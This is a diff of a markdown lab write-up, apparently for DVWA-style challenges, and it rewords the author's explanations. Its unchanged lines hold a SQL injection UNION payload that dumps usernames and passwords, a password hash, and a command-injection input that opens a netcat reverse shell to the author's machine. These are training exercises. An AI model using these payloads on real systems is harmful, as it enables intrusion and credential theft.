@@ -53,9 +53,7 @@
 > 
 > **Answer:**
 > 
-> To address the challenge, I started by examining the PHP source code for the SQL Injection page, identifying that the query used session variables which incorporated user inputs directly into an SQL command. This setup was prone to SQL injection if the session variable could be manipulated.
-> 
-> Using the input:
+> I began tackling the challenge by diving into the PHP source code of the SQL Injection page. I noticed that the query was directly incorporating user inputs via session variables into an SQL command. This configuration was particularly vulnerable to SQL injection, especially if those session variables could be altered.
 > 
 > ```
 > a' UNION SELECT user, password FROM users -- -&Submit=Submit
@@ -111,9 +109,7 @@ Surname: 5f4dcc3b5aa765d61d8327deb882cf99
 > 
 > **Answer:**
 > 
-> Upon navigating to the webpage and seeing tan input, I suspected a possible command injection vulnerability.
-> 
-> Before attempting to exploit the vulnerability, I set up a netcat listener on my local machine using:
+> Upon navigating to the webpage and seeing user input, I suspected a possible command injection vulnerability. Before attempting to exploit the vulnerability, I set up a **netcat listener** on my local machine using:
 > 
 > ```
 > nc -lvp 1234
@@ -124,14 +120,7 @@ Surname: 5f4dcc3b5aa765d61d8327deb882cf99
 > ```
 > 127.0.0.1 & nc -e /bin/sh 192.168.117.124 1234
 > ```
-> 
-> This command instructed the server to establish a reverse shell connection to my local machine on port 1234.
-> 
-> 
-> 
-> Upon successful exploitation of the vulnerability, I gained a reverse shell connection to the server.
-> 
-> Inside the reverse shell, I navigated the filesystem to locate the secret file. Initially, I used the `ls -a` command to list all files, including hidden ones, and discovered `.the_secret_file`.
+> I now have a **reverse shell!** Using `ls -a` command to list all hidden files, I found `.the_secret_file`.
 > 
 > I then used the `cat` command to reveal its contents:
 > 
